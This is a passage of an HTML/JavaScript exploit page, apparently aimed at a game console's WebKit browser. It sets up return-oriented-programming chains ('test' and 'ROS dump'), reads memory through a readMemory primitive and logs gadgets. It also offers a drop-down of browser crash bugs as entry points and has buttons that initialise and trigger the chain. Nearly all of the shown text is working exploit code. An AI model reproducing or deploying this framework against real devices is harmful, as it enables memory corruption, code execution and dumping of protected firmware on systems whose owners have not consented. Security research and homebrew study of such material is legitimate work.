		send_read(readMemory(document.getElementById('exploit'),jump_1_addr-0x2,jump_1_bytecount+0x2).substr(6,jump_1_bytecount), jump_1_addr-0x2, jump_1_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_1), log_div);
		//dbg("Triggering exploit....", log_div);
		dbg("READY TO TRIGGER EXPLOIT!");
		//alert("Ready to trigger!");
		//trigger(jump_1_addr);
		
		// To avoid garbage collection...
		logAdd(s2hex(usb_fp_rosdump), log_div);
		logAdd(s2hex(_gadgets), log_div);
		logAdd(s2hex(jump_2), log_div);
		logAdd(s2hex(jump_1), log_div);
		
		
		disableElement("init-rop");
		disableElement("init-ros");
		enableElement("btn-trigger");

		return;
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}

function setInitVariables(chain){
	if (chain === "rosdump"){
		log_div = logEntry();
		// FIXME the new_line requires a different tag on browser than on python console, a replacement algo needs implemented in dbg function call..
		 //new_line = "\r\n"; // Python console tag
		new_line = "<br>"; // browser tag
		//
		used_offsets_arr = [80000000];
		usb_fp_rosdump,gadgets,jump_2,jump_1;
		usb_fp_rosdump_addr=0,gadgets_addr=0,jump_2_addr=0,jump_1_addr=0;
		//usb_fp_rosdump_bytecount=0x1B*2;
		usb_fp_rosdump_bytecount=0x1C*2;
		gadgets_bytecount=0x155*2;
		jump_2_bytecount=0x24*2;
		jump_1_bytecount=0x4*2;
	}
	
	else if (chain === "test"){
		//gadget,payload,orig_stack_frame,idps_storage_usb,idps_hex,idps_base,usb_generic_storage,jump_2,jump_1,g,j1,j2;
		//gadget,payload,orig_stack_frame,orig_link_register,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
		//gadget,payload,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
		gadget,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
		//payload_addr=0;		
		//orig_stack_frame_addr = 0;
		//orig_link_register_addr = 0;
		gadget_addr=0;
		jump_1_addr=0;
		jump_2_addr=0;
		idps_storage_usb_addr=0;
		idps_hex_addr=0;
		idps_base_addr=0;
		//usb_generic_storage_addr = 0;
		init_addr = 0;
	}
}


function getEntryPoint(marked){
	//alert(document.getElementById('marked').value);
	enableElement("init-rop");
	enableElement("init-ros");
	var marked_value =  marked.value;
	return marked_value;
	//var selection = document.getElementById('marked').value);
	//return selection;
} 

function enableElement(elem){
	document.getElementById(elem).disabled = false;
}

function disableElement(elem){
	document.getElementById(elem).disabled = true;
}

function doTrigger(){
	//alert("Return From Trigger ;)");// used for embedded
	//trigger(jump_1_addr);
	
	var entry = getEntryPoint(marked);
	if (entry ===""){
		alert("No Entry Point Selected!");
	}
	else{
		trigger(entry, jump_1_addr);
	}
	
	//alert("Press OK To Trigger ;)");// used for page loads
	
	reloadPage();
}

function reloadPage(){
	enableElement("marked");
	disableElement("init-rop");
	disableElement("init-ros");
	disableElement("btn-trigger");
	location.reload();
}

</script>
</head>

<!--<body id="BodyID" onload="initROP();">-->

<body id="BodyID">
	<div id="controls">
		<button id="reload-page" onclick="reloadPage();">Reload Page</button> &nbsp&nbsp/&nbsp&nbsp
		<select name="marked" id="marked" onchange="getEntryPoint(this);">
			<option value="">Select Entry Point</option>
			<option value="parse-float">** parse-float **</option>
			<option value="canvas-toDataURL-crash">canvas-toDataURL-crash</option>
			<option value="changing-frame-hierarchy-in-onload">changing-frame-hierarchy-in-onload</option>
			<option value="crash-on-clear-selection">crash-on-clear-selection</option>
			<option value="crash-when-reparent-sibling">crash-when-reparent-sibling</option>
			<option value="delete-button-background-image-none">delete-button-background-image-none</option>
			<option value="detached-doctype">detached-doctype</option>
			<option value="dispatch-event-no-document">dispatch-event-no-document</option>
			<option value="dns-prefetch-control">dns-prefetch-control</option>
			<option value="doctype-event-listener-crash">doctype-event-listener-crash</option>
			<option value="huge-column-gap-crash">huge-column-gap-crash</option>
			<option value="insert-image-on-top-of-directional-text">insert-image-on-top-of-directional-text</option>
			<option value="insert-span-into-long-text">insert-span-into-long-text</option>
			<option value="modify-ua-rules-from-javascript">modify-ua-rules-from-javascript</option>
			<option value="negative-remaining-length-crash">negative-remaining-length-crash</option>
			<option value="nodeIndex72inside120">nodeIndex72inside120</option>
			<option value="overflow-height-float-not-removed-crash">overflow-height-float-not-removed-crash</option>
			<option value="position-absolute-to-fixed-crash">position-absolute-to-fixed-crash</option>
			<option value="reflected-img-crash">reflected-img-crash</option>
			<option value="rtl-selection-crash">rtl-selection-crash</option>
		</select> &nbsp&nbsp/&nbsp&nbsp
		<button id="init-rop" onclick="initROP();" disabled>Init Test Chain</button> &nbsp&nbsp/&nbsp&nbsp
		<button id="init-ros" onclick="initROS();" disabled>Init ROS Dump Chain</button> &nbsp&nbsp/&nbsp&nbsp
		<button id="btn-trigger" onclick="doTrigger();" disabled>Trigger</button>
	</div>
		<!--If this message appears without further log below, refresh the page because the exploit failed!<br>-->
		<div id="exploit" />
		<br>
		<div id="log"></div>
		<br>
		<!-- Multiple Entry Points Needed HTML Start -->
		<div id="crashtest1"></div>
		
		<canvas id="cr4sh" width="65536" height="65536"></canvas>
		
		<div dir='rtl' id='rtl1' style='white-space:pre' contentEditable>the </div>
		<div dir='rtl' id='rtl2' style='white-space:pre' contentEditable>אחת </div>
		<div dir='ltr' id='ltr1' style='white-space:pre' contentEditable>the </div>
		<div dir='ltr' id='ltr2' style='white-space:pre' contentEditable>אחת </div>
		
		<textarea id="overflow-trig-1" style="width: 100%" rows="1"></textarea>
        <object data="x" align="left"></object>
        <textarea id="overflow-trig-1" rows="1"></textarea>
		
		<!--<div style="position: relative;">
			<div id="target" style="top: 50px; position: absolute;">
				<div style="height: 50px; width: 50px; background-color: red;"></div>
			</div>
		</div>-->
		<!-- Multiple Entry Points Needed HTML End -->
		<br>
	</body>
</html>
